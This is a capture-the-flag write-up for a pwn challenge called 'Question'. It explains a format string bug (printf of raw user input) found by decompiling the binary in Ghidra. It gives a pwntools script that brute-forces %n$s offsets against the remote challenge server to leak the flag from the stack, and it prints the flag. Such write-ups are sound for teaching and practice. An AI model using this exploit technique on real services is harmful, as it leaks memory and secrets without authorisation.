---
title: Question
date: 2024-09-27
author: zacian
tags:
  - pwn
draft: false
---

## Description

“Life is not a period or a question mark. It’s an exclamation point” — Bashar

Instance: nc 143.110.187.156 30001

Author: tourpran

## Intuition

On connecting to the netcat instance we can see the following

```
Heard there is a big dawg in town ?
Do you know where he is ?
```

and on giving any input, it prints the same back 

```
Do you know where he is ? Hello
Hello
All you have to say is this, huh:
Hello
```

The challenge also gave us a binary file. But on executing, it gave us `segmentation fault`. So i thought to have a decompiled view of the binary using ghidra.

```c
int main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  char *sav_flag;
  size_t buff_size;
  FILE *flag_val;
  char *user_input;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  flag_val = fopen("./flag.txt","r");
  buff_size = 80;
  getline(&sav_flag,&buff_size,flag_val);
  puts("Heard there is a big dawg in town ?");
  printf("Do you know where he is ? ");
  __isoc99_scanf(&DAT_00102057,user_input);
  puts("All you have to say is this, huh:");
  printf(user_input);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

we can see that the `user_input` it printed directly, without any specified format string, which could cause the input data to be evaluated as a command and is vulnerable to [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)

To test we can input different format strings. The one most people is `%s` sometimes in multiple sets. For our challenge this didn't work but using `%s%s` did print out `null`. Another payload is using `%p` which prints a random address value in hex.

## Solution

Now from the above code we can see, the value of flag is being read and saved in a variable, which is named as `flag_val`. The value is hence being saved on the stack. We just need to know the offset to the pointer and we can print the value.

As the binary was not runnig locally, testing for the offset became a bit hard, so instead i bruteforced the offset using `pwntools`

```py
from pwn import *

for i in range(50):
    io = remote('143.110.187.156', 30001)
    io.sendline(f"%{i}$s".encode())
    io.recvuntil(b'All you have to say is this, huh:')
    check_flag = io.recvall()
    if b'H7CTF' in check_flag:
        print(check_flag.decode('utf-8'))
        io.close()
        break
    io.close()
```

and the flag we got is `H7CTF{f0rm47_s71ng$_4r3_s7!ll_r3l3v4n7}`